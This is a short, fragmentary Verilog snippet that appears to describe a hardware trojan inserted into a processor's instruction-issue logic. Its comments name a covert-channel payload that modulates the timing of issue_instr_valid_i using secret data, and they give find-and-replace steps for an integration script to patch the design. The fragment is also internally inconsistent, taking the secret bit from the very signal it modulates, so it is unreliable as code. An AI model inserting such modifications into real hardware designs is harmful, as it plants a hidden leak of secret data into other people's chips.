 ...
 * Payload: Modulate timing of issue_instr_valid_i based on secret data
 * 
...
assign secret_bit = issue_instr_valid_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of issue_instr_valid_i
//
// Integration Script Must Modify:
//
// IF issue_instr_valid_i is timing-sensitive:
//   Find: assign issue_instr_valid_i = ready_signal;
//   Replace: assign issue_instr_valid_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
